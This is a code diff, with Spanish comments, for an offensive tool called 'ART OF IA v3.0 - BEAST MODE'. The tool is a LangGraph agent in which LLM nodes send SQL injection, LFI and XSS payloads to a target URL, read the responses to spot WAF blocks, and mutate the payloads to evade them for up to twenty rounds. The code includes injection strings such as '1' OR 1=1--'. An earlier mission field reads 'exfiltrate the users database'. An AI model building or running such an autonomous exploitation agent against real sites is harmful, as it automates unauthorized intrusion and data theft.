@@ -3,84 +3,128 @@ import asyncio
 from typing import TypedDict, List, Dict, Any
 from langgraph.graph import StateGraph, END
 
-# Importamos tus módulos especializados
-from dual_llm_pattern import LocalDualLLM
-from mutators import arsenal  # Importamos el ArsenalManager (Sprint 1)
-from planner import Planner     # Asumiendo que tienes la clase Planner en planner.py
-from quarantine import Quarantine # Asumiendo que tienes la clase Quarantine en quarantine.py
-from sniper import Sniper       # Asumiendo que tienes la clase Sniper en sniper.py
-from reflector import Reflector   # El Reflector Heurístico que acabamos de crear
+# Importaciones de los módulos actualizados en la Fase 1
+from dual_llm_pattern import PrivilegedLLM, QuarantineLLM, SymbolicController
+from reflector import Reflector
+# Nota: Asegúrate de que mutators.py y planner.py existan en tu repositorio
+try:
+    from mutators import arsenal 
+    from planner import Planner
+    from sniper import Sniper
+except ImportError as e:
+    print(f"[!] Warning: Algunos módulos auxiliares no encontrados ({e}).")
+    print("El grafo se construirá, pero los nodos de Sniper/Planner podrían fallar si no existen.")
 
 # --- ESQUEMA DE ESTADO "BEAST MODE" ---
 class AgentState(TypedDict):
+    # Misión y Target
     mission: str
     target_url: str
+    
+    # Payload y Vulnerabilidad
     current_payload: str
-    vuln_type: str  # NUEVO: 'SQLI', 'LFI', 'XSS'
-    exfiltrated_data: str
+    vuln_type: str  # 'SQLI', 'LFI', 'XSS'
+    
+    # Control de Flujo
     iteration: int
-    status: str
+    status: str # 'starting', 'success', 'blocked', 'failed'
+    
+    # Datos de Análisis (Para el Reflector y el Cerebro)
+    exfiltrated_data: str
+    last_response_metadata: Dict[str, Any] # Aquí viaja el simplified_content y delta_t
+    waf_metadata: Dict[str, Any] # Info recuperada por QuarantineLLM
     failed_attempts_summary: List[Dict[str, Any]] 
-    last_response_metadata: Dict[str, Any] # Para el Reflector Heurístico
-    waf_metadata: Dict[str, Any] 
+    
+    # Mapa Simbólico (Para tracking de tokens)
+    symbolic_map: List[str]
 
 class ArtOfIAOrchestrator:
     def __init__(self, target_url: str):
         self.target_url = target_url
         self.max_iterations = 20
         
-        # Instanciamos los nodos modulares
-        # Pasamos la URL al reflector para que sepa dónde disparar
-        self.planner = Planner() 
-        self.quarantine = Quarantine() 
-        self.sniper = Sniper() 
+        # 1. El Corazón del Aislamiento: Controlador Simbólico Único
+        # Este objeto es compartido por L1 y L2 para mantener el Vault de datos.
+        self.controller = SymbolicController()
+        
+        # 2. Instancias de LLMs (Dual-LLM Pattern)
+        self.quarantine = QuarantineLLM(self.controller)
+        self.brain = PrivilegedLLM(self.controller)
+        
+        # 3. Nodos de Ejecución y Juicio
         self.reflector = Reflector(target_url=target_url)
         
-        # El cerebro central para coordinar estrategias
-        self.brain = LocalDualLLM(model="ollama/qwen3.5:9b")
+        # Módulos de soporte (Assuming these are implemented as classes/objects)
+        try:
+            self.planner = Planner() 
+            self.sniper = Sniper()
+        except:
+            self.planner = None
+            self.sniper = None
 
     async def planner_node(self, state: AgentState):
-        """Coordinador de estrategia y Context Folding."""
+        """Coordinador de estrategia inicial."""
         print(f"\n[*] [PLANNER] Iteración {state.get('iteration', 0)}. Analizando misión...")
         
-        # Llamamos a la lógica del archivo planner.py
-        result = await self.planner.execute(state)
-        
-        # Forzamos el incremento de iteración y mantenemos el estado
+        if self.planner:
+            result = await self.planner.execute(state)
+        else:
+            # Fallback si no hay planner.py: Definir un payload base
+            result = {"current_payload": "1' OR 1=1--", "vuln_type": "SQLI"}
+            
         return {
             **result, 
             "iteration": state.get("iteration", 0) + 1
         }
 
     async def quarantine_node(self, state: AgentState):
-        """Sanitizador de logs y detector de reglas WAF."""
-        print("[*] [QUARANTINE] Analizando respuesta del WAF...")
-        # Llamamos a la lógica de quarantine.py
-        result = await self.quarantine.execute(state)
-        return result
+        """L1: Analiza la respuesta hostil y simboliza las entidades."""
+        print("[*] [QUARANTINE] Ejecutando aislamiento simbólico (L1)...")
+        
+        # Obtenemos la última respuesta del reflector
+        raw_response = state.get("last_response_metadata", {}).get("last_content", "")
+        if not raw_response:
+            # Si no hay contenido, usamos la URL como input inicial
+            raw_response = f"Target URL: {state['target_url']}"
+
+        # L1 extrae, clasifica y simboliza
+        symbolic_findings = await self.quarantine.parse_and_symbolize(raw_response)
+        
+        # Actualizamos la metadata del WAF y el mapa de tokens
+        return {
+            "waf_metadata": {
+                "block_detected": symbolic_findings.get("waf_block_detected", False),
+                "status_code": symbolic_findings.get("status_code"),
+                "detected_tech": symbolic_findings.get("technologies", [])
+            },
+            "symbolic_map": symbolic_findings.get("parameters", []),
+            "status": "analyzed"
+        }
 
     async def sniper_node(self, state: AgentState):
-        """El Ejecutor: Elige la bala y muta el payload."""
-        print(f"[*] [SNIPER] Generando payload para {state.get('vuln_type', 'SQLI')}...")
+        """El Ejecutor: Consulta al Cerebro (L2) y muta el payload."""
+        print(f"[*] [SNIPER] Consultando estrategia de evasión para {state.get('vuln_type', 'SQLI')}...")
         
-        # 1. Obtener la estrategia del cerebro (Dual-LLM)
-        # El cerebro decide si usar 'HEX_ENCODE', 'SQUEEZE', 'DOT_SQUASH', etc.
+        # 1. El Cerebro decide la estrategia basada en RAG y Tokens Tipados
         strategy = await self.brain.decide_strategy(state) 
         
-        # 2. Usar el ARSENAL Multi-Vector (Sprint 1)
-        # Aquí es donde ocurre la magia: muta según la vulnerabilidad detectada
-        mutated_payload = arsenal.mutate(
-            payload=state["current_payload"], 
-            vuln_type=state.get("vuln_type", "SQLI"), 
-            strategy=strategy
-        )
+        # 2. Mutación del payload usando el Arsenal
+        try:
+            # Usamos el arsenal para aplicar la mutación elegida por el cerebro
+            mutated_payload = arsenal.mutate(
+                payload=state["current_payload"], 
+                vuln_type=state.get("vuln_type", "SQLI"), 
+                strategy=strategy
+            )
+            print(f"[+] [SNIPER] Mutación aplicada: {strategy}")
+        except Exception as e:
+            print(f"[-] Error en mutación: {e}")
+            mutated_payload = state["current_payload"] # Fallback
         
-        print(f"[+] [SNIPER] Nueva mutación aplicada: {strategy}")
         return {"current_payload": mutated_payload}
 
     async def reflector_node(self, state: AgentState):
-        """El Juez Heurístico: Determina si el ataque funcionó."""
-        # Llamamos al archivo reflector.py (Heurística de tiempo/longitud/diff)
+        """El Juez: Ejecuta el payload y analiza la respuesta (Skeletal DOM & Delta T)."""
         result = await self.reflector.execute(state)
         return result
 
@@ -88,7 +132,7 @@ class ArtOfIAOrchestrator:
         """Construcción del Grafo de Estado de LangGraph."""
         workflow = StateGraph(AgentState)
         
-        # Añadimos los nodos
+        # Añadir nodos
         workflow.add_node("planner", self.planner_node)
         workflow.add_node("quarantine", self.quarantine_node)
         workflow.add_node("sniper", self.sniper_node)
@@ -98,13 +142,17 @@ class ArtOfIAOrchestrator:
         workflow.set_entry_point("planner")
         workflow.add_edge("planner", "reflector")
         
-        # Ruteo Condicional basado en el status del Reflector
+        # Ruteo Condicional: 
+        # Si el Reflector detecta 'success' -> FIN
+        # Si detecta 'blocked' o 'failed' -> QUARANTINE para analizar el WAF
         workflow.add_conditional_edges(
             "reflector",
-            lambda x: "quarantine" if x["status"] in ["blocked", "failed"] else END,
+            lambda x: x["status"],
             {
-                "quarantine": "quarantine", 
-                END: END
+                "success": END,
+                "blocked": "quarantine",
+                "failed": "quarantine",
+                "analyzed": "sniper" # Caso interno
             }
         )
         
@@ -114,32 +162,37 @@ class ArtOfIAOrchestrator:
         return workflow.compile()
 
 async def main():
-    # Configuración inicial
-    target = "http://target-waf.com/api" # Cambia por tu target
+    # Configuración del Target
+    target = "http://testphp.vulnweb.com" # Ejemplo de target
     orchestrator = ArtOfIAOrchestrator(target_url=target)
     app = orchestrator.build_graph()
     
-    print("=========================================================")
-    print(" ART OF IA v3.0 - BEAST MODE: MULTI-VECTOR + HEURISTICS ")
-    print("=========================================================")
+    print("\n" + "="*60)
+    print(" ART OF IA v3.0 - BEAST MODE: PHASE 1 IMPLEMENTED ")
+    print(" [Simbólico Tipado] | [Skeletal DOM Diff] | [Delta T Analysis] ")
+    print("="*60 + "\n")
     
-    # Estado inicial optimizado
+    # Estado inicial optimizado para la Fase 1
     initial_state = {
-        "mission": "Exfiltrar base de datos de usuarios",
+        "mission": "Detectar y explotar SQL Injection",
         "target_url": target,
-        "current_payload": "1' AND (SELECT 1)=1--", # Payload inicial
-        "vuln_type": "SQLI", # El agente puede cambiar esto a LFI o XSS
+        "current_payload": "1' AND (SELECT 1)=1--", 
+        "vuln_type": "SQLI", 
         "exfiltrated_data": "",
         "iteration": 0,
         "status": "starting",
         "failed_attempts_summary": [],
         "last_response_metadata": {},
-        "waf_metadata": {}
+        "waf_metadata": {},
+        "symbolic_map": []
     }
     
-    async for output in app.astream(initial_state):
-        # El estado se actualiza automáticamente en cada nodo
-        pass
+    try:
+        async for output in app.astream(initial_state):
+            # El estado se actualiza automáticamente en el grafo
+            pass
+    except Exception as e:
+        print(f"[!] Error en el ciclo de ejecución: {e}")
 
 if __name__ == "__main__":
     asyncio.run(main())
